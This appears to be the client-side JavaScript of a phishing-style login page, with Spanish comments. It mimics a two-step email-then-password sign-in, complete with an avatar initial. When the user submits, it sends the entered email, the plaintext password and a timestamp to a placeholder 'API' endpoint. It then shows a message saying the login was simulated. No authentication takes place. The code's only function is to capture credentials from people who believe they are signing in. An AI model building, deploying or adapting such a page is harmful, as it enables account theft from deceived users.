 // Elementos
    const emailContainer = document.querySelector('.email-container');
    const passwordContainer = document.getElementById('password-screen');
    const nextButton = document.getElementById('next-btn');
    const backButton = document.getElementById('back-btn');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const userEmailDisplay = document.getElementById('user-email-display');
    const userAvatar = document.getElementById('user-avatar');
    const showPasswordBtn = document.getElementById('show-password');
    const loginBtn = document.getElementById('login-btn');

    // Ir a contraseña
    nextButton.addEventListener('click', () => {
      const email = emailInput.value.trim();
      if (email) {
        userEmailDisplay.textContent = email;
        userAvatar.textContent = email.charAt(0).toUpperCase();
        emailContainer.style.display = 'none';
        passwordContainer.style.display = 'block';
      } else {
        alert('Por favor ingresa un correo electrónico o teléfono');
        emailInput.focus();
      }
    });

    // Volver a email
    backButton.addEventListener('click', () => {
      passwordContainer.style.display = 'none';
      emailContainer.style.display = 'block';
    });

    // Mostrar/ocultar contraseña
    showPasswordBtn.addEventListener('click', () => {
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        showPasswordBtn.textContent = 'Ocultar';
      } else {
        passwordInput.type = 'password';
        showPasswordBtn.textContent = 'Mostrar';
      }
    });

    // Enviar datos a la API
    loginBtn.addEventListener('click', async () => {
      const email = userEmailDisplay.textContent.trim(); // Usa el email mostrado
      const password = passwordInput.value.trim();

      if (!email || !password) {
        alert('Por favor completa ambos campos.');
        return;
      }

      try {
        const response = await fetch('API', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            email: email,
            password: password,
            fecha: new Date().toLocaleString()
          })
        });

        if (response.ok) {
          alert('Inicio de sesión simulado correctamente.');
          passwordInput.value = '';
        } else {
          alert('Error al enviar los datos.');
        }
      } catch (error) {
        console.error('Error:', error);
        alert('Error de red o del servidor.');
      }
    });

    // Enter para avanzar desde email
    emailInput.addEventListener('keypress', e => {
      if (e.key === 'Enter') nextButton.click();
    });

    // Enter para enviar desde contraseña
    passwordInput.addEventListener('keypress', e => {
      if (e.key === 'Enter') loginBtn.click();
    });
